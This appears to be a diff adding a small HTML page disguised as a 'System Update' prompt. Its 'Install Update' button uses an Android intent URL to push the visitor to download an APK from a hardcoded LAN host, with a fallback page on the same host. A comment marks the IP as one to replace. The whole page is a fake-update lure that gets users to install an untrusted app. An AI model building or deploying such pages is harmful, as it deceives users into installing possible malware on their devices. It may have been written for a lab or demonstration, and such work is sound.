@@ -1,0 +1,22 @@
+<!doctype html>
+<html>
+<body>
+
+<h2>System Update</h2>
+
+<button onclick="go()">Install Update</button>
+
+<script>
+function go() {
+  location.href =
+    "intent://192.168.1.17:3000/dummy.apk" +   // GANTI IP
+    "#Intent;" +
+    "scheme=http;" +
+    "action=android.intent.action.VIEW;" +
+    "S.browser_fallback_url=http://192.168.1.17:3000/fallback.html;" +
+    "end";
+}
+</script>
+
+</body>
+</html>
